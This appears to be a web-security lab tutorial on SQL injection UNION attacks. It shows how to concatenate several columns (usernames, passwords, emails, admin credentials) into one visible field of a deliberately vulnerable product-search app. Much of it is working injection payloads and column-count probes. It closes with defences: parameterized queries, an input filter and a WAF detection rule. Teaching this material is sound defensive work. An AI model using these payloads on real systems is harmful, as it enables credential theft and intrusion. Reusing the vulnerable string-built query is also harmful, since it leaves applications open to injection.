# UNION Attack: Retrieving Multiple Values in a Single Column

## **What is SQL?**

SQL, or Structured Query Language, is a programming language used to manage and interact with relational databases, enabling users to perform tasks like retrieving, inserting, updating, or deleting data.

![SQL Diagram](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/SQL.drawio.svg)



SQL is used in various operations such as searching for products in an e-commerce application. The server constructs an SQL query using user input (like a search term) and sends it to the database to retrieve matching records. The results are then presented to the user based on the query's output.

## What is Retrieving Multiple Values in a Single Column?

In many SQL injection UNION attacks, applications only display one or two columns clearly to users, but attackers want to extract multiple pieces of data (username, password, email, etc.) from database tables. The solution is to use **string concatenation** to combine multiple database fields into a single visible column.

### The Challenge for Attackers

When performing UNION attacks, attackers often face limited visibility:
```sql
-- Original query shows only 2 columns, but column 2 (title) is the only clearly visible one
SELECT id, title FROM products WHERE name LIKE '%search%'

-- Problem: You want username AND password AND email, but only one column is visible
UNION SELECT NULL, username FROM users  -- Only shows username
-- OR
UNION SELECT NULL, password FROM users  -- Only shows password

-- Solution: Concatenate multiple values into the single visible column
UNION SELECT NULL, username||':'||password||':'||email FROM users
-- Shows: "john_doe:password123:john@email.com" in the title field
```


## Key Requirements for Multiple Value Extraction

For successful multiple value extraction, two critical techniques must be mastered:

### 1. String Concatenation
Different databases use different concatenation operators:

**SQLite (this lab):**
```sql
SELECT username||':'||password||':'||email FROM users
-- Result: "john_doe:password123:john@email.com"
```

**MySQL:**
```sql
SELECT CONCAT(username,':',password,':',email) FROM users
-- Result: "john_doe:password123:john@email.com"
```



### 2. Strategic Delimiter Usage
Use delimiters to separate different pieces of data for easy reading:

**Common delimiters:**
```sql
-- Using colon (:)
username||':'||password

-- Using pipe (|)  
username||'|'||password

-- Using tilde (~)
username||'~'||password||'~'||email

-- Using multiple characters
username||' :: '||password||' :: '||email
```



## Objective

Learn how to extract multiple database values in a single visible column by:
1. **Identifying limited visible columns** in the target application
2. **Using string concatenation** to combine multiple database fields
3. **Implementing strategic delimiters** for readable data separation
4. **Extracting comprehensive data sets** from multiple database fields in one attack

## Setup Instructions

### Option 1: Using Docker (Recommended)

1. **Pull the Docker Image**

   ```bash
   docker pull yeasin97/sqli-lab06:latest
   ```

2. **Run the Docker Container**

   ```bash
   docker run -d -p 3000:3000 -p 5173:5173 yeasin97/sqli-lab06:latest
   ```
   
3. **Create a Load Balancer in Poridhi's Cloud**

   Find the `eth0` IP address with `ifconfig` command:

   ```bash
   ifconfig
   ```

   ![ipconfig](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/ifconfig.png)

   Create a Load Balancer with the `eth0 IP` address and the port `5173`

   ![loadb](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/loadb.png)

4. **Access the Web Application**

   Access the web application with the URL provided by the `loadbalancer`

   ![Home](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/home.png)

### Option 2: Local Setup

1. **Clone the Repository**

   ```bash
   git clone https://github.com/yeasin097/SQLMultiValueLab.git
   cd SQLMultiValueLab
   ```

2. **For Windows**: Double Click on the `run.bat` to start the application.

3. **Setup Linux**

   In a new terminal:

   ```bash
   chmod +x run.sh
   ./run.sh
   ```

4. **Access the Application**

   Open your browser and navigate to the URL shown in your terminal (usually `http://localhost:5173`)

### Project Structure

The application follows a modern separated frontend-backend architecture:

```
├── backend/
│   ├── package-lock.json
│   ├── package.json
│   └── server.js
└── frontend/
    ├── public/
    │   └── vite.svg
    ├── src/
    │   ├── App.css
    │   ├── App.jsx
    │   ├── Home.jsx
    │   ├── ProductDetail.jsx
    │   ├── SearchFilter.jsx
    │   ├── assets/
    │   │   └── react.svg
    │   ├── index.css
    │   └── main.jsx
    ├── index.html
    ├── package-lock.json
    ├── package.json
    └── vite.config.js
```

## Understanding the Target Application

### Normal Application Behavior
1. **Homepage**: Displays product search results with limited visibility
2. **Search Filter**: Input box allows searching for products by name
3. **URL Structure**: `http://localhost:5173/?search=laptop` searches for products
4. **SQL Query**: Backend executes `SELECT id, name FROM products WHERE name LIKE '%laptop%'`
5. **Limited Visibility**: Only product names are clearly displayed (2 columns, but only column 2 is visible)

## Lab Instructions

### Phase 1: Reconnaissance and Limited Visibility Discovery

#### Step 1: Understand the Normal Application
1. **Browse the product search**
   - Visit http://localhost:5173
   - Notice only product names are displayed prominently
   - Use the search box to search for "laptop", "phone", etc.
   - Observe how the URL changes: `?search=laptop`, `?search=phone`, etc.

![Search Laptop](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/searchlaptop.png)

![Search Phone](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/searchphone.png)

2. **Examine the SQL query**
   - Look at the bottom of the page for "Executed SQL Query"
   - Notice it returns only 2 columns: `id, name`
   - Only the `name` column is prominently displayed

![Examine Query](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/examinequery.png)

   - This tells us we have limited visibility for data extraction

#### Step 2: Test for SQL Injection Vulnerability
Try adding a single quote to break the SQL syntax:

```
URL: ?search=laptop'
```

**Expected Result**: You should see a database error, confirming the parameter is vulnerable.

![SQL Error](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/sqlerror.png)

#### Step 3: Determine Column Count Using ORDER BY
The ORDER BY technique helps determine how many columns the original query returns.

**Test systematically:**

```
?search=laptop' ORDER BY 1--
```

**What happens**: Orders results by the 1st column. Should work without errors.

![Order 1 Result](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/order1result.png)

```
?search=laptop' ORDER BY 2--
```

**What happens**: Orders by 2nd column. Should work.

![Order 2 Result](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/order2result.png)
```
?search=laptop' ORDER BY 3--
```

**What happens**: Tries to order by 3rd column. Should fail with error because there are only 2 columns.

![Order 3 Result](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/order3result.png)

**Key Learning**: Only 2 columns exist, and only column 2 (name) is clearly visible.

#### Step 4: Confirm Column Count with UNION NULL Test
Once you know there are 2 columns, confirm with a NULL test:

```
?search=laptop' UNION SELECT NULL,NULL--
```

**Expected Result**: Should display normal products without errors, confirming 2 columns.

![Null Test Result](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/nulltest.png)

### Phase 2: Single Value Extraction (The Problem)

#### Step 5: Attempt Single Value Extraction
Try extracting just usernames to see the limitation:

```
?search=laptop' UNION SELECT NULL,username FROM users--
```

**Result**: You can see usernames, but not passwords or emails.

![Username Only](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/usernameonly.png)

**The Problem**: You want to see username AND password AND email, but you can only extract one field at a time in the visible column.

### Phase 3: Multiple Value Extraction (The Solution)

#### Step 6: Basic Concatenation - Username and Password
Combine username and password using concatenation:

```
?search=laptop' UNION SELECT NULL,username||':'||password FROM users--
```

**Result**: You should see both username and password separated by colon in the product name field.

![Username Password](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/usernamepassword.png)

#### Step 7: Three Value Extraction - Username, Password, and Email
Combine three values using concatenation:

```
?search=laptop' UNION SELECT NULL,username||':'||password||':'||email FROM users--
```

**Result**: You should see username, password, and email all in one visible field.

![Username Password Email](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/userpassemail.png)



#### Step 8: Extract Admin Data with Labels
Extract admin data with descriptive labels:

```
?search=laptop' UNION SELECT NULL,'Admin: '||admin_username||' | Pass: '||admin_password||' | Role: '||role FROM admin_users--
```

**Result**: Admin credentials with clear labels for easy identification.

![Admin Data](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/admindata.png)

#### Step 9: Maximum Data Extraction - All User Information
Extract all available user information in one query:

```
?search=laptop' UNION SELECT NULL,'ID:'||id||'|User:'||username||'|Email:'||email||'|Pass:'||password FROM users--
```

**Result**: Complete user profiles in a single visible column.

![Complete User Data](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/maxdata.png)



## Database Schema Deep Dive

Understanding the target database structure helps craft effective attacks:

### products table (2 columns - limited visibility)
```sql
CREATE TABLE products (
    id INTEGER PRIMARY KEY,        -- Position 1: Not clearly visible
    name TEXT                      -- Position 2: Clearly visible (target for injection)
);
```

### users table (4 columns)
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT,                 -- Target for extraction
    email TEXT,                    -- Target for extraction
    password TEXT                  -- Sensitive target
);
```

### admin_users table (4 columns)
```sql
CREATE TABLE admin_users (
    id INTEGER PRIMARY KEY,
    admin_username TEXT,           -- High-value target
    admin_password TEXT,           -- Critical sensitive data
    role TEXT                      -- Privilege information
);
```

## Attack Examples with Detailed Explanations

### Basic Concatenation
```
?search=laptop' UNION SELECT NULL,username||':'||password FROM users--
```
**SQL Executed:**
```sql
SELECT id, name FROM products WHERE name LIKE '%laptop' UNION SELECT NULL,username||':'||password FROM users--%'
```
**Explanation**: Combines username and password with colon separator in the single visible column.

### Advanced Multi-Value Extraction
```
?search=laptop' UNION SELECT NULL,'User:'||username||'|Email:'||email||'|Pass:'||password FROM users--
```
**SQL Executed:**
```sql
SELECT id, name FROM products WHERE name LIKE '%laptop' UNION SELECT NULL,'User:'||username||'|Email:'||email||'|Pass:'||password FROM users--%'
```
**Result Mapping:**
- Column 1 (id): NULL → Not displayed
- Column 2 (name): Concatenated string → Shows as "User:john_doe|Email:john@email.com|Pass:password123"


## Prevention and Mitigation

### Primary Defense: Parameterized Queries

**Vulnerable Code:**
```javascript
const query = `SELECT id, name FROM products WHERE name LIKE '%${search}%'`;
```

**Secure Code:**
```javascript  
const query = `SELECT id, name FROM products WHERE name LIKE ?`;
db.all(query, [`%${search}%`], (err, rows) => {
    // Handle results
});
```

### Secondary Defenses

**Input Validation:**
```javascript
const search = req.query.search;
if (search.includes('||') || search.includes('CONCAT')) {
    return res.status(400).json({error: 'Invalid search term'});
}
```

**Output Limitation:**
```javascript
// Limit displayed data length
const displayName = product.name.length > 50 ? 
    product.name.substring(0, 50) + '...' : 
    product.name;
```

**Database Function Restrictions:**
```sql
-- Restrict concatenation functions for application user
REVOKE EXECUTE ON FUNCTION CONCAT FROM 'app_user'@'localhost';
```

**Web Application Firewall (WAF) Rules:**
```
# Block concatenation attempts
SecRule ARGS "@rx (?i:\|\||concat|char\()" "block,msg:'SQL Concatenation Attack'"
```

## Conclusion

This lab provides comprehensive training on extracting multiple database values in a single visible column through SQL injection UNION attacks. By working through the exercises, you've learned:

- How to identify applications with limited data visibility
- String concatenation techniques for combining multiple database fields
- Strategic delimiter usage for readable data separation
- Advanced formatting techniques for maximum data extraction
- The efficiency and stealth advantages of multiple value extraction

---
